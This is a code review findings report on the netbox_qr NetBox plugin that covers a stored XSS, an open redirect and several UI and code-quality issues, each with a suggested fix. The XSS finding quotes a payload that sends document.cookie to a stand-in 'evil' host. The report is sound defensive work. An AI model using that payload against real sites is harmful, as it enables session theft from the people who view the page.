# netbox_qr code review findings

Full-plugin review focused on UI/UX, security, and code quality. Most severe first.

## Security

### 1. Stored XSS: object data rendered unescaped into label HTML
**File:** `netbox_qr/rendering.py:25` (also `:62` in `render_placeholder`)
**Severity:** High

`render_jinja2()` (NetBox's `utilities.jinja2`) builds a `SandboxedEnvironment` with no
`autoescape=True`, so `{{ object }}` / `{{ object.field }}` / custom bindings render
`str(instance)` or `object_data` raw. The result (`body_html`) is then injected with
`{{ body_html|safe }}` in `render.html:158` and `qrtemplate_bulk_print_sheet.html:78`.

The plugin's own `DEFAULT_LAYOUT` (`views.py`) ships a text element bound to `object` out of
the box. A low-privilege user who can rename a device to e.g.
`<img src=x onerror=fetch('//evil/?c='+document.cookie)>` gets that script executed in the
browser of anyone who later opens that device's QR panel (on by default for most core models)
or includes it in a bulk print — a stored-XSS privilege-escalation path from "can edit a
device name" to "script runs in an admin's session."

**Fix:** pass `environment_params={'autoescape': True}` to the `render_jinja2()` call that
produces `body_html` only (both call sites in `rendering.py`) — **not** to the `qr_value`
render, since that's raw text/URL data encoded into the QR bitmap, not HTML, and escaping it
would corrupt values containing `&`. `css_code`/`js_code` are untouched by this fix — they're
raw admin-authored strings, never Jinja2-rendered, so `|safe` there is intentional.

### 2. Redirect target trusts unvalidated `HTTP_REFERER`
**File:** `netbox_qr/views.py:286` (also `:325`)
**Severity:** Medium

`QRBulkPrintView.post()` and `QRBulkPrintSheetView.post()` both do
`redirect(request.META.get('HTTP_REFERER') or 'home')` on the "no valid objects" error path.
`HTTP_REFERER` is a client-controlled header. NetBox core deliberately avoids this pattern —
`GetReturnURLMixin.get_return_url()` validates any `return_url` via `safe_for_redirect()`
instead of touching Referer at all. Real-world exploitability is limited today (browsers
restrict Referer spoofing, and the endpoint is CSRF-protected), but it's an
open-redirect-shaped anti-pattern that diverges from the project's own safe convention.

**Fix:** use NetBox's `GetReturnURLMixin` / `safe_for_redirect()` (or just drop `HTTP_REFERER`
and always redirect to a fixed known-safe URL) instead of trusting the header.

### Notes, not filed as findings
- **QRTemplate isn't permission-checked at render time** — `QRRenderView` / `QRBulkPrintView`
  filter `is_active=True` but don't check `view_qrtemplate`, so any authenticated user with
  view access to the target object can render with any active template. This mirrors NetBox's
  own export-template trust model (staff-authored, not sensitive), so it's likely intentional
  — worth confirming that's the desired boundary.
- **No cap on bulk-print batch size** — since `max_bulk_print_items` was removed on request, a
  POST can now drive an unbounded `pk__in=[...]` query plus synchronous per-object Jinja2
  rendering. Django's `DATA_UPLOAD_MAX_NUMBER_FIELDS` (default 1000) puts a rough ceiling on
  it regardless, so this is a minor FYI, not a regression worth acting on unprompted.

## UI/UX

### 3. "Report a bug" link points to google.com, duplicated in 3 templates
**File:** `netbox_qr/templates/netbox_qr/render.html:128`
**Also:** `templates/netbox_qr/inc/object_qr_panel.html:71`, `templates/netbox_qr/qrtemplate_bulk_print.html:147`
**Severity:** Low

A user hits a print-driver problem, clicks the dedicated bug-report link expecting to file
it, and instead lands on a generic Google search page — the link is a placeholder that was
never wired up to a real issue tracker. Identical dead link is copy-pasted in three places.

## Code quality

### 4. Django messages framework strings aren't translated
**File:** `netbox_qr/views.py:285` (also `:146`, `:155`, `:324`, `:370`)
**Severity:** Low

Strings like `'No valid objects were selected.'`, `'Could not parse the submitted layout.'`,
`'Design saved.'`, `'QR settings saved.'` always render in English regardless of the active
locale, even though the plugin ships a complete Ukrainian translation catalog for everything
else — an inconsistency a Ukrainian-locale user will notice immediately after an error.

**Fix:** wrap in `gettext_lazy` / `_()` like the rest of the plugin.

### 5. Print-driver dispatch duplicated in 3 places
**File:** `netbox_qr/static/netbox_qr/qr-bulk-print.js:178` (`driverImpl()`)
**Also:** `render.html:143-155` (`netboxQrPrintLabel()`), `object_qr_panel.html`'s `netboxQrPanelPrintLabel()`
**Severity:** Low

The niimbot/zpl/escpos name-to-implementation dispatch is reimplemented three times instead
of one shared registry. Adding, renaming, or removing a driver requires updating three
separate `if/else` chains kept in sync purely by convention — missing one silently breaks
that surface's print button for the new/changed driver with no compile-time signal.

**Fix:** a single `window.NetBoxQRDrivers = { niimbot, zpl, escpos }` registry in
`qr-print-common.js`, referenced from all three call sites.

### 6. Unvalidated `width_mm`/`height_mm` POST data reaches `save()`
**File:** `netbox_qr/views.py:149`
**Severity:** Low

`QRTemplateDesignView.post()` assigns `request.POST['width_mm']` / `['height_mm']` straight
onto the model without validation before `save()`. Django's `.save()` does not call
`full_clean()` by default, so a malformed or out-of-range value (e.g. more than 6 digits, or
non-numeric junk) submitted directly to this endpoint — bypassing the UI's own numeric input —
fails as a raw `decimal.InvalidOperation` / `DataError` from the DB layer instead of a clean
validation error. `layout_to_css`'s `_num()` fallback also means the stored `width_mm` and the
CSS actually generated for that save can silently disagree once a bad value is involved.

**Fix:** validate/clamp (or run the value through the model field's own validators) before
assigning.

---

## Suggested priority

1. Fix #1 (stored XSS) — real, default-exploitable security issue.
2. Fix #2 (open redirect) — quick, matches existing NetBox convention.
3. Everything else — polish, do opportunistically or batch together.
